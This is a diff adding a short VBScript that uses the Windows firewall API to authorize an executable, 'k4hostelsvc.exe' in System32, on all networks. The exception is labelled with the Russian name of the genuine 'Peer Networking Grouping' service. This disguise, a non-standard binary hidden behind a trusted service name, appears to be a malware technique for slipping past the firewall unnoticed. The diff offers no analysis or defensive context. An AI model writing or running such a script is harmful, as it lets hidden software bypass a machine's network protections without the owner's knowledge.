@@ -1,0 +1,12 @@
+Dim fwMgr
+Set fwMgr = CreateObject("HNetCfg.FwMgr")
+Dim profile
+Set profile = fwMgr.LocalPolicy.CurrentProfile
+Dim app
+Set app = CreateObject("HNetCfg.FwAuthorizedApplication")
+app.ProcessImageFileName = "%SystemRoot%\System32\k4hostelsvc.exe"
+app.Name = "Группирование одноранговой сети Windows"
+app.Scope = 0
+app.IpVersion = 2
+app.Enabled = TRUE
+profile.AuthorizedApplications.Add app
